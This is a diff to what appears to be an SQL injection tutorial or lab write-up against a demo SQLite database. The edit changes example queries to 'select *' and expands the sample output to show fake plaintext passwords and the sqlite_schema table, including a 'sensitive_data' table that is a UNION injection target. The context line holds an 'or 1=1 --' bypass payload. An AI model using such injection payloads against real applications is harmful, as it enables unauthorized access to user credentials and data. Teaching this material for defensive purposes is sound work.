@@ -273,36 +273,36 @@ select username,role,email from users where username == 'admin' or 1=1 --';
 We want to use union to join some of the `sqlite_schema` data with the
 3 columns we have from users.
 ```sql
-select username,role,email from users;
-select type,name,sql from sqlite_schema;
+select * from users;
+select * from sqlite_schema;
 ```
 ```
-+----------+---------------+-------------------+
-| username |     role      |       email       |
-+----------+---------------+-------------------+
-| admin    | administrator | admin@company.com |
-| guest    | guest         | guest@company.com |
-| user1    | user          | user1@company.com |
-+----------+---------------+-------------------+
++----+----------+-----------+---------------+-------------------+
+| id | username | password  |     role      |       email       |
++----+----------+-----------+---------------+-------------------+
+| 1  | admin    | admin123  | administrator | admin@company.com |
+| 2  | guest    | guest     | guest         | guest@company.com |
+| 3  | user1    | password1 | user          | user1@company.com |
++----+----------+-----------+---------------+-------------------+
 ```
 ```
-+-------+----------------+-------------------------------+
-| type  |      name      |              sql              |
-+-------+----------------+-------------------------------+
-| table | users          | CREATE TABLE users (          |
-|       |                |    id INTEGER PRIMARY KEY,    |
-|       |                |    username TEXT,             |
-|       |                |    password TEXT,             |
-|       |                |    role TEXT,                 |
-|       |                |    email TEXT                 |
-|       |                | )                             |
-+-------+----------------+-------------------------------+
-| table | sensitive_data | CREATE TABLE sensitive_data ( |
-|       |                |    id INTEGER PRIMARY KEY,    |
-|       |                |    data_type TEXT,            |
-|       |                |    content TEXT               |
-|       |                | )                             |
-+-------+----------------+-------------------------------+
++-------+----------------+----------------+----------+-------------------------------+
+| type  |      name      |    tbl_name    | rootpage |              sql              |
++-------+----------------+----------------+----------+-------------------------------+
+| table | users          | users          | 2        | CREATE TABLE users (          |
+|       |                |                |          |    id INTEGER PRIMARY KEY,    |
+|       |                |                |          |    username TEXT,             |
+|       |                |                |          |    password TEXT,             |
+|       |                |                |          |    role TEXT,                 |
+|       |                |                |          |    email TEXT                 |
+|       |                |                |          | )                             |
++-------+----------------+----------------+----------+-------------------------------+
+| table | sensitive_data | sensitive_data | 3        | CREATE TABLE sensitive_data ( |
+|       |                |                |          |    id INTEGER PRIMARY KEY,    |
+|       |                |                |          |    data_type TEXT,            |
+|       |                |                |          |    content TEXT               |
+|       |                |                |          | )                             |
++-------+----------------+----------------+----------+-------------------------------+
 ```
 
 We confirm that we can merge 3 columns with NULL,NULL,NULL, but we know we can.
